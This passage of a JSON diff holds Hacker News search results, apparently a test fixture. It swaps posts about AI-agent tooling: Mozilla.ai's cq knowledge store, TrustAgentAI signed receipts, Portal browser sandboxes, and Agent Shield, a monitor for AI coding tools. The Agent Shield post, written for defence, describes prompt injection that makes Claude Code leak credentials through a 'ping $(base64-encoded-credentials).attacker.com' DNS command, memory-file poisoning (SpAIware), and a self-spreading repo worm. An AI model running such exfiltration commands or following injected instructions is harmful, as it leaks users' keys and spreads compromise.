directories (~/.claude/, ~/.cursor/, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\n<em>MCP</em> <em>server</em> allowlisting and discovery\nPolicy enforcement: kill/suspend/block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release."
             },
             "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "Show HN: Cq – Stack Overflow for AI coding agents"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://blog.mozilla.ai/cq-stack-overflow-for-agents/"
+              "fullyHighlighted": false,
+              "matchLevel": "partial",
+              "matchedWords": [
+                "tools"
+              ],
+              "value": "AI coding <em>tools</em> have broad filesystem and network access"
             }
           },
           "_tags": [
             "story",
-            "author_peteski22",
-            "story_47491466",
-            "show_hn"
+            "author_shadag",
+            "story_47498251",
+            "ask_hn"
           ],
-          "author": "peteski22",
-          "created_at": "2026-03-23T16:11:03Z",
-          "created_at_i": 1774282263,
-          "num_comments": 0,
-          "objectID": "47491466",
-          "points": 2,
-          "story_id": 47491466,
-          "story_text": "Hi HN, I&#x27;m Peter from Mozilla.ai.<p>We&#x27;re building cq; an open standard that lets AI coding agents share what they learn so they stop rediscovering the same failures independently. Think Stack Overflow, but for agents.<p>What it does:<p>* Agents query a shared knowledge store before tackling unfamiliar work (APIs, CI&#x2F;CD, build tools, frameworks)<p>* When an agent discovers something non-obvious; a workaround, a gotcha, a fix... it proposes that knowledge back to the store<p>* Knowledge earns trust over time through confidence scoring and confirmation across agents and codebases<p>Why we&#x27;re building it:<p>Stack Overflow went from 200k questions&#x2F;month in 2014 to under 4k in December 2025; developers moved to AI tools. But those tools trained on that same corpus, and their knowledge is frozen at a cutoff date. Meanwhile, every agent hitting the same wall independently burns tokens and compute rediscovering what another agent already figured out yesterday. We want to close that loop.<p>The journey:<p>We started earlier this month (March 2026), biased toward a working prototype over a theoretical whitepaper. The core challenge is designing a system where knowledge earns trust dynamically rather than being treated as static instructions. We built it as an MCP server so it plugs into the emerging agent ecosystem rather than being locked to one tool. Shortly after we started, Andrew Ng independently published asking whether exactly this kind of system should exist; a nice signal we weren&#x27;t imagining the problem.<p>Tech stack:<p>* Python MCP server (FastMCP) managing a local SQLite knowledge store<p>* Optional team API (FastAPI, Docker) for sharing knowledge across an org<p>* Installs as a Claude Code plugin or OpenCode MCP server<p>* Local-first by default; your knowledge stays on your machine unless you opt into team sync<p>* Apache 2.0 licensed<p>Where we are:<p>We have a working PoC, not a finished product. We&#x27;re dogfooding it with internal Mozilla.ai projects, finding friction, shaping the knowledge model, and figuring out what &quot;trust&quot; means when agents are the ones producing and consuming knowledge. 84% of developers now use or plan to use AI tools, but 46% don&#x27;t trust the accuracy. We think collective validation across agents is part of the answer.<p>Try it and tell us what&#x27;s broken:<p>claude plugin marketplace add mozilla-ai&#x2F;cq\nclaude plugin install cq<p>Or clone the repo: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;mozilla-ai&#x2F;cq\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;mozilla-ai&#x2F;cq</a><p>Blog post with the full story: <a href=\"https:&#x2F;&#x2F;blog.mozilla.ai&#x2F;cq-stack-overflow-for-agents&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;blog.mozilla.ai&#x2F;cq-stack-overflow-for-agents&#x2F;</a><p>We&#x27;d love eyes on this; the knowledge model, the MCP integration experience, whether local-first → team-sync makes sense for your workflows. Open issues, tell us what&#x27;s missing, tell us what&#x27;s wrong. We&#x27;re building in the open because we think this should be a community-shaped standard, not something one company decides.",
-          "title": "Show HN: Cq – Stack Overflow for AI coding agents",
-          "updated_at": "2026-03-23T18:02:23Z",
-          "url": "https://blog.mozilla.ai/cq-stack-overflow-for-agents/"
+          "author": "shadag",
+          "children": [
+            47498256
+          ],
+          "created_at": "2026-03-24T03:16:03Z",
+          "created_at_i": 1774322163,
+          "num_comments": 1,
+          "objectID": "47498251",
+          "points": 1,
+          "story_id": 47498251,
+          "story_text": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~&#x2F;.ssh. That bothered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer&#x27;s AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig&#x27;s announcement this week — sits in the network path and inspects API calls. That architecture can&#x27;t see file reads, subprocess spawning, or DNS exfiltration via ping. It can&#x27;t monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn&#x27;t the API layer. It&#x27;s the OS.<p>What&#x27;s built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~&#x2F;.claude&#x2F;, ~&#x2F;.cursor&#x2F;, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill&#x2F;suspend&#x2F;block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release.",
+          "title": "AI coding tools have broad filesystem and network access",
+          "updated_at": "2026-03-24T03:19:38Z"
         },
         {
           "_highlightResult": {
@@ -2245,51 +2009,6 @@
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
-              "value": "kirillostrovsky"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "self",
-                "improving",
-                "ai"
-              ],
-              "value": "MCP solves connectivity between agents and tools. It doesn't solve accountability.<p>When an <em>AI</em> agent calls execute_wire_transfer today, there's no cryptographic proof it happened, no proof who authorized it, and no tamper-evident record of the outcome. Editable logs and unverified timestamps don't cut it when real money or infrastructure is on the line.<p>I've been building TrustAgentAI — an open-source accountability layer that wraps MCP tool calls in a 3-phase signed receipt protocol:<p>Intent Envelope → Agent A signs: &quot;I intend to call X with these exact args&quot;\nAcceptance Receipt → Agent B signs: &quot;I validated and accepted this intent&quot;\nExecution Envelope → Agent B signs: &quot;I executed it, here is the outcome hash&quot;<p>Each receipt is signed with Ed25519 over a JCS (RFC 8785) canonical hash. All three are chained in a DAG ledger — causality is cryptographically enforced, not just logged. The ledger Merkle-batches entries and anchors roots externally (L2 blockchain), making retroactive tampering detectable even by a server admin.<p>The result is a Dispute Pack: a <em>self</em>-contained bundle that proves what happened, when, and who authorized it. Designed to satisfy auditors, insurers, and legal arbitrators — not just dashboards.<p>What's different from existing MCP security tools:\nScopeGate, <em>ai</em>-runtime-guard, and similar tools focus on preventing unauthorized actions at the permission level. TrustAgentAI focuses on <em>proving</em> what happened after the fact — non-repudiation for the cases where permissions were granted but accountability is still needed. These approaches are complementary.<p>Technical stack:<p>Ed25519 via @noble/ed25519 (audited, zero-dependency)\nJCS canonicalization per RFC 8785 (deterministic hashing across platforms)\nDAG ledger with Merkle batching (each entry's hash includes parent hashes)\nAnti-replay via per-(did, nonce) uniqueness with TTL + 5s clock skew tolerance\nRisk budget enforcement (D4) at proxy level before execution\nHTTP server exposing /accept, /executed, /dispute/:traceId<p>The proxies are sidecars — they intercept existing MCP JSON-RPC traffic without changes to agents or tools.\nbashnpm install @trustagentai/a2a-core\ntypescriptimport { ProxyAGateway, ProxyBGateway } from &quot;@trustagentai/a2a-core/proxy&quot;;\nimport { DAGLedger } from &quot;@trustagentai/a2a-core/ledger&quot;;<p>// Wrap your existing MCP tool call\nconst result = await proxyA.forwardToolCall(mcpCall, executeTool);\n// result._a2a contains Intent + Acceptance + Execution envelopes\n// All cryptographically signed and recorded in tamper-evident ledger\nGitHub: https://github.com/kirbas/trustagent-a2a-protocol\nnpm: https://www.npmjs.com/package/@trustagentai/a2a-core\nProtocol spec (v0.4): https://trustagentai.net/trustagentai-a2a-protocol\nWould love feedback on:<p>The JCS + SHA-256 hash target rule (spec §4) — is there a better canonicalization approach?\nL2 anchoring strategy — Base vs Arbitrum, and sync vs async anchoring?\nWhether the Dispute Pack format is sufficient for real legal/insurance use cases"
-            },
-            "title": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "TrustAgentAI – Cryptographic receipts for MCP tool calls (non-repudiation layer)"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_kirillostrovsky",
-            "story_47421489",
-            "ask_hn"
-          ],
-          "author": "kirillostrovsky",
-          "children": [
-            47477382,
-            47427947,
-            47434251
-          ],
-          "created_at": "2026-03-18T04:04:52Z",
-          "created_at_i": 1773806692,
-          "num_comments": 0,
-          "objectID": "47421489",
-          "points": 6,
-          "story_id": 47421489,
-          "story_text": "MCP solves connectivity between agents and tools. It doesn&#x27;t solve accountability.<p>When an AI agent calls execute_wire_transfer today, there&#x27;s no cryptographic proof it happened, no proof who authorized it, and no tamper-evident record of the outcome. Editable logs and unverified timestamps don&#x27;t cut it when real money or infrastructure is on the line.<p>I&#x27;ve been building TrustAgentAI — an open-source accountability layer that wraps MCP tool calls in a 3-phase signed receipt protocol:<p>Intent Envelope → Agent A signs: &quot;I intend to call X with these exact args&quot;\nAcceptance Receipt → Agent B signs: &quot;I validated and accepted this intent&quot;\nExecution Envelope → Agent B signs: &quot;I executed it, here is the outcome hash&quot;<p>Each receipt is signed with Ed25519 over a JCS (RFC 8785) canonical hash. All three are chained in a DAG ledger — causality is cryptographically enforced, not just logged. The ledger Merkle-batches entries and anchors roots externally (L2 blockchain), making retroactive tampering detectable even by a server admin.<p>The result is a Dispute Pack: a self-contained bundle that proves what happened, when, and who authorized it. Designed to satisfy auditors, insurers, and legal arbitrators — not just dashboards.<p>What&#x27;s different from existing MCP security tools:\nScopeGate, ai-runtime-guard, and similar tools focus on preventing unauthorized actions at the permission level. TrustAgentAI focuses on proving what happened after the fact — non-repudiation for the cases where permissions were granted but accountability is still needed. These approaches are complementary.<p>Technical stack:<p>Ed25519 via @noble&#x2F;ed25519 (audited, zero-dependency)\nJCS canonicalization per RFC 8785 (deterministic hashing across platforms)\nDAG ledger with Merkle batching (each entry&#x27;s hash includes parent hashes)\nAnti-replay via per-(did, nonce) uniqueness with TTL + 5s clock skew tolerance\nRisk budget enforcement (D4) at proxy level before execution\nHTTP server exposing &#x2F;accept, &#x2F;executed, &#x2F;dispute&#x2F;:traceId<p>The proxies are sidecars — they intercept existing MCP JSON-RPC traffic without changes to agents or tools.\nbashnpm install @trustagentai&#x2F;a2a-core\ntypescriptimport { ProxyAGateway, ProxyBGateway } from &quot;@trustagentai&#x2F;a2a-core&#x2F;proxy&quot;;\nimport { DAGLedger } from &quot;@trustagentai&#x2F;a2a-core&#x2F;ledger&quot;;<p>&#x2F;&#x2F; Wrap your existing MCP tool call\nconst result = await proxyA.forwardToolCall(mcpCall, executeTool);\n&#x2F;&#x2F; result._a2a contains Intent + Acceptance + Execution envelopes\n&#x2F;&#x2F; All cryptographically signed and recorded in tamper-evident ledger\nGitHub: https:&#x2F;&#x2F;github.com&#x2F;kirbas&#x2F;trustagent-a2a-protocol\nnpm: https:&#x2F;&#x2F;www.npmjs.com&#x2F;package&#x2F;@trustagentai&#x2F;a2a-core\nProtocol spec (v0.4): https:&#x2F;&#x2F;trustagentai.net&#x2F;trustagentai-a2a-protocol\nWould love feedback on:<p>The JCS + SHA-256 hash target rule (spec §4) — is there a better canonicalization approach?\nL2 anchoring strategy — Base vs Arbitrum, and sync vs async anchoring?\nWhether the Dispute Pack format is sufficient for real legal&#x2F;insurance use cases",
-          "title": "TrustAgentAI – Cryptographic receipts for MCP tool calls (non-repudiation layer)",
-          "updated_at": "2026-03-22T13:32:47Z"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
               "value": "sebg"
             },
             "title": {
@@ -2365,9 +2084,55 @@
           "title": "Hermes Agent: The self-improving AI agent",
           "updated_at": "2026-03-12T01:37:34Z",
           "url": "https://github.com/NousResearch/hermes-agent"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "zach4123"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "self",
+                "improving",
+                "ai"
+              ],
+              "value": "Hey HN, I'm Zach, founder of Portal.\nPortal lets you share a live sandbox browser session as a link.<p>Try it here: <a href=\"https://www.makeportals.com/try\" rel=\"nofollow\">https://www.makeportals.com/try</a><p>Instead of asking someone to sign up, install software, or book a demo for user research, onboarding, or sales, you send a link and they interact with the real product in a sandboxed browser environment, then you get session replays.<p>Each viewer gets a fresh remote browser instance that starts from a defined state (URL, cookies, extensions, local files, etc). Sessions are isolated and expire automatically.<p>The sessions have configurable guardrails: - disabling buttons - restricting URLs - API rate limits - Time limits<p>In Watch Mode, an <em>AI</em> Agent with contextual awareness clicks through a demo and explains the product. In Play Mode, users explore a guardrailed session while the <em>AI</em> answers questions.<p>Portal came from trying to get feedback on a chrome extension I’d built to help people with disabilities control gmail with voice. People were cautious to download it &amp; I kept wishing I could send a browser session with the extension already installed to try safely &amp; an <em>AI</em> to explain async.<p>Portal grew out of that idea: share an exact browser state where your product works without requiring installs or already logged into demo accounts.<p>Some early uses: - Getting user feedback on local projects in Claude Code with a temporary links/rate limits - Helping onboard to high friction/integration products like extension/add-ons or code reviewers - Replacing inbound product demos in sales for SMBs by embedding on landing pages or sending to prospects with the <em>AI</em> agent <em>self</em>-serve created - Ending live presentations with a QR code open to a live product environment - PMs sharing prototype links for feedback in slack<p>Docs: <a href=\"https://www.makeportals.com/docs/mcp\" rel=\"nofollow\">https://www.makeportals.com/docs/mcp</a>\nTry in Claude Code: claude mcp add --transport http portal <a href=\"https://mcp-portal-sogv.onrender.com/mcp\" rel=\"nofollow\">https://mcp-portal-sogv.onrender.com/mcp</a>\nOpenClaw: <a href=\"https://clawhub.ai/Zach213/portal\" rel=\"nofollow\">https://clawhub.<em>ai</em>/Zach213/portal</a><p>Curious about the browser sessions you’d want to share w/ an <em>AI</em> guide- we’re <em>improving</em> latency of interaction every week &amp; think stateful URLs/shareable product states are the future. Love any feedback as we're early!"
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Show HN: Portal (SPC F25) – Try products with browser session sandboxes"
+            },
+            "url": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "https://www.makeportals.com/"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_zach4123",
+            "story_47340686",
+            "show_hn"
+          ],
+          "author": "zach4123",
+          "created_at": "2026-03-11T20:07:44Z",
+          "created_at_i": 1773259664,
+          "num_comments": 0,
+          "objectID": "47340686",
+          "points": 5,
+          "story_id": 47340686,
+          "story_text": "Hey HN, I&#x27;m Zach, founder of Portal.\nPortal lets you share a live sandbox browser session as a link.<p>Try it here: <a href=\"https:&#x2F;&#x2F;www.makeportals.com&#x2F;try\" rel=\"nofollow\">https:&#x2F;&#x2F;www.makeportals.com&#x2F;try</a><p>Instead of asking someone to sign up, install software, or book a demo for user research, onboarding, or sales, you send a link and they interact with the real product in a sandboxed browser environment, then you get session replays.<p>Each viewer gets a fresh remote browser instance that starts from a defined state (URL, cookies, extensions, local files, etc). Sessions are isolated and expire automatically.<p>The sessions have configurable guardrails: - disabling buttons - restricting URLs - API rate limits - Time limits<p>In Watch Mode, an AI Agent with contextual awareness clicks through a demo and explains the product. In Play Mode, users explore a guardrailed session while the AI answers questions.<p>Portal came from trying to get feedback on a chrome extension I’d built to help people with disabilities control gmail with voice. People were cautious to download it &amp; I kept wishing I could send a browser session with the extension already installed to try safely &amp; an AI to explain async.<p>Portal grew out of that idea: share an exact browser state where your product works without requiring installs or already logged into demo accounts.<p>Some early uses: - Getting user feedback on local projects in Claude Code with a temporary links&#x2F;rate limits - Helping onboard to high friction&#x2F;integration products like extension&#x2F;add-ons or code reviewers - Replacing inbound product demos in sales for SMBs by embedding on landing pages or sending to prospects with the AI agent self-serve created - Ending live presentations with a QR code open to a live product environment - PMs sharing prototype links for feedback in slack<p>Docs: <a href=\"https:&#x2F;&#x2F;www.makeportals.com&#x2F;docs&#x2F;mcp\" rel=\"nofollow\">https:&#x2F;&#x2F;www.makeportals.com&#x2F;docs&#x2F;mcp</a>\nTry in Claude Code: claude mcp add --transport http portal <a href=\"https:&#x2F;&#x2F;mcp-portal-sogv.onrender.com&#x2F;mcp\" rel=\"nofollow\">https:&#x2F;&#x2F;mcp-portal-sogv.onrender.com&#x2F;mcp</a>\nOpenClaw: <a href=\"https:&#x2F;&#x2F;clawhub.ai&#x2F;Zach213&#x2F;portal\" rel=\"nofollow\">https:&#x2F;&#x2F;clawhub.ai&#x2F;Zach213&#x2F;portal</a><p>Curious about the browser sessions you’d want to share w&#x2F; an AI guide- we’re improving latency of interaction every week &amp; think stateful URLs&#x2F;shareable product states are the future. Love any feedback as we&#x27;re early!",
+          "title": "Show HN: Portal (SPC F25) – Try products with browser session sandboxes",
+          "updated_at": "2026-03-18T00:55:28Z",
+          "url": "https://www.makeportals.com/"
         }
       ]
     }
   ],
-  "totalHits": 50
+  "totalHits": 45
 }
